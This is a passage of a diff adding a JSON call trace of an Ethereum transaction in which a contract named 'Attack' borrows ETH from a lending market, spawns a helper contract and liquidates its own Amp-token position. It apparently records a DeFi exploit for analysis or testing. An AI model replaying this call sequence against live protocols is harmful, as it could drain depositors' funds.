+        ],
+        "fromName": "Comptroller",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "return_value": [
+            1000000000000000000
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "calldata": "0x0933c1ed00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000024c37f68e200000000000000000000000038c40427efbaae566407e4cde2a91947df0bd22b00000000000000000000000000000000000000000000000000000000",
+        "returndata": "0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a5996d46fe35611c86ca9e",
+        "return_value": [
+            0
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "op": "CALL",
+        "value": 355000000000000000000,
+        "calldata": "0x",
+        "fromName": "CEther",
+        "toName": "Attack"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "borrowVerify(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 355000000000000000000
+        },
+        "return_value": null,
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "borrowVerify(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "borrowAmount": 355000000000000000000
+        },
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "op": "CREATE",
+        "fromName": "Attack"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "_to": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "_value": 9740000000000000000000000
+        },
+        "return_value": [
+            true
+        ],
+        "fromName": "Attack",
+        "toName": "Amp"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "_interfaceHash": "0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "_interfaceHash": "0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "op": "CALL",
+        "value": 0,
+        "calldata": "0x794404d1000000000000000000000000000000000000000000080e86753f84522f800000",
+        "fromName": "Attack"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "CALL",
+        "value": 0,
+        "function": "approve(address,uint256)",
+        "inputs": {
+            "_spender": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "_value": 115792089237316195423570985008687907853269984665640564039457584007913129639935
+        },
+        "return_value": [
+            true
+        ],
+        "toName": "Amp"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "CALL",
+        "value": 0,
+        "function": "liquidateBorrow(address,uint256,address)",
+        "inputs": {
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000,
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "liquidateBorrow(address,uint256,address)",
+        "inputs": {
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000,
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "CALL",
+        "value": 0,
+        "function": "accrueInterest()",
+        "inputs": {},
+        "return_value": [
+            0
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "liquidateBorrowAllowed(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "liquidateBorrowAllowed(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0,
+            2417223480577,
+            355000000000000000000,
+            206848892548606231814997144
+        ],
+        "fromName": "Comptroller",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "return_value": [
+            1000000000000000000
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "calldata": "0x0933c1ed00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000024c37f68e200000000000000000000000038c40427efbaae566407e4cde2a91947df0bd22b00000000000000000000000000000000000000000000000000000000",
+        "returndata": "0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000101d0cea7f08a45f000000000000000000000000000000000000000000000000a5996d46fe35611c86ca9e",
+        "return_value": [
+            0,
+            0,
+            19480000000000000000000000,
+            200197298118981821831498398
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "getAccountSnapshot(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0,
+            0,
+            19480000000000000000000000,
+            200197298118981821831498398
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            17832542795200
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "underlying()",
+        "inputs": {},
+        "return_value": [
+            "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            18446744073709559184,
+            5648000,
+            1630302179,
+            1630302179,
+            18446744073709559184
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            8
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18446744073709555151,
+            315731990000000,
+            1630295166,
+            1630295166,
+            18446744073709555151
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FiatTokenProxy"
+    },
+    {
+        "from": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "to": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+        "op": "DELEGATECALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "FiatTokenProxy",
+        "toName": "FiatTokenV2_1"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "borrowBalanceStored(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "calldata": "0x0933c1ed0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002495dd919300000000000000000000000038c40427efbaae566407e4cde2a91947df0bd22b00000000000000000000000000000000000000000000000000000000",
+        "returndata": "0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000101d0cea7f08a45f000000",
+        "return_value": [
+            19480000000000000000000000
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "to": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "op": "DELEGATECALL",
+        "function": "borrowBalanceStored(address)",
+        "inputs": {
+            "account": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CErc20Delegator",
+        "toName": "CCollateralCapErc20Delegate"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "accrualBlockNumber()",
+        "inputs": {},
+        "return_value": [
+            13125072
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "repayBorrowAllowed(address,address,address,uint256)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "payer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "repayBorrowAllowed(address,address,address,uint256)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "payer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "repayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "_tokenHolder": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            14183858581302237334110531
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transferFrom(address,address,uint256)",
+        "inputs": {
+            "_from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "_to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "_value": 9740000000000000000000000
+        },
+        "return_value": [
+            true
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Amp"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "_interfaceHash": "0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "_interfaceHash": "0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "_tokenHolder": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            23923858581302237334110531
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "STATICCALL",
+        "function": "liquidateCalculateSeizeTokens(address,address,uint256)",
+        "inputs": {
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "actualRepayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0,
+            906862180000
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "liquidateCalculateSeizeTokens(address,address,uint256)",
+        "inputs": {
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "actualRepayAmount": 9740000000000000000000000
+        },
+        "return_value": [
+            0,
+            906862180000
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6"
+        },
+        "return_value": [
+            17832542795200
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "underlying()",
+        "inputs": {},
+        "return_value": [
+            "0xfF20817765cB7f73d4bde2e66e067E58D11095C2"
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            18446744073709559184,
+            5648000,
+            1630302179,
+            1630302179,
+            18446744073709559184
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+            "quote": "0x0000000000000000000000000000000000000348"
+        },
+        "return_value": [
+            8
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xfAaA7460eD59C12E204349766CE73Cf5202e6aD6",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "latestRoundData(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18446744073709555151,
+            315731990000000,
+            1630295166,
+            1630295166,
+            18446744073709555151
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "latestRoundData()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "op": "STATICCALL",
+        "function": "decimals(address,address)",
+        "inputs": {
+            "base": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+            "quote": "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"
+        },
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FeedRegistry"
+    },
+    {
+        "from": "0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf",
+        "to": "0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "fromName": "FeedRegistry",
+        "toName": "AccessControlledOffchainAggregator"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "to": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "FiatTokenProxy"
+    },
+    {
+        "from": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+        "to": "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF",
+        "op": "DELEGATECALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            6
+        ],
+        "fromName": "FiatTokenProxy",
+        "toName": "FiatTokenV2_1"
+    },
+    {
+        "from": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
